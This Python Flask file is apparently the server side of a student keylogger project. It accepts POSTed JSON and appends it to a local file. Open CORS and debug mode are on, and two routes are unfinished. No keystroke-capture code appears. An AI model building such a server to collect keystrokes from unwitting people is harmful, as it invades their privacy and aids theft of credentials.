from flask import Flask,jsonify,request,json


from flask_cors import CORS

app = Flask(__name__)
CORS(app)
data_file = r'C:\Users\t570\Documents\kodcod\full stack\keylogger\saved_data.json'

@app.route('/save_data', methods=['POST'])
def save_data():
    data = request.get_json()
    print(data)
    with open(data_file, 'a', encoding='utf-8') as file:
        json.dump(data , file, ensure_ascii=False, indent=4)
    return  [{"status":True}]
 
  
  
    
@app.route('/get_text', methods=['GET'])
def to_get_text_full_data():
    return jsonify(data_file)



@app.route('/',methods=['GET'])
def filter_data():
    pass
    
    

        
   

    
    


if __name__ == '__main__':
    app.run(debug=True)